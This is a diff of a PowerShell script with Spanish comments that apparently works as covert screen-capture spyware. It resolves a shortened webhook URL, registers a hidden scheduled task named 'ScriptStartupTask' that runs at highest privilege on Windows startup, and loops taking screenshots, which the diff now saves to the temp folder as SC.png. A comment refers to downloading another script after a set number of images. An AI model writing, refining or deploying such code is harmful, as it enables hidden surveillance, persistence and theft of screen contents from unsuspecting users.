@@ -4,20 +4,8 @@ $maxImages = 1 # Cantidad máxima de imágenes antes de descargar el otro script
 
 # Detección de URL acortada
 if ($hookurl.Length -ne 121) {
-    Write-Host "Shortened Webhook URL Detected11..."
+    Write-Host "Shortened Webhook URL Detected..."
     $hookurl = (irm $hookurl).url
-}
-
-# Obtener la ruta del directorio donde se encuentra este script
-$scriptDirectory = $PSScriptRoot
-if (-not $scriptDirectory) {
-    $scriptDirectory = Split-Path -Parent $MyInvocation.MyCommand.Definition
-}
-
-# Verificar si la ruta del directorio está definida
-if (-not $scriptDirectory) {
-    Write-Host "No se puede determinar la ruta del directorio del script."
-    exit
 }
 
 # Crear la tarea programada para iniciar el script al iniciar Windows
@@ -27,7 +15,7 @@ $settings = New-ScheduledTaskSettingsSet -Hidden -DontStopIfGoingOnBatteries
 Register-ScheduledTask -TaskName "ScriptStartupTask" -Action $action -Trigger $trigger -Settings $settings -RunLevel Highest
 
 do {
-    $Filett = Join-Path -Path $scriptDirectory -ChildPath "SC.png"
+    $Filett = "$env:temp\SC.png"
     # Verificar si el archivo ya existe antes de crear uno nuevo
     if (-not (Test-Path $Filett)) {
         Add-Type -AssemblyName System.Windows.Forms
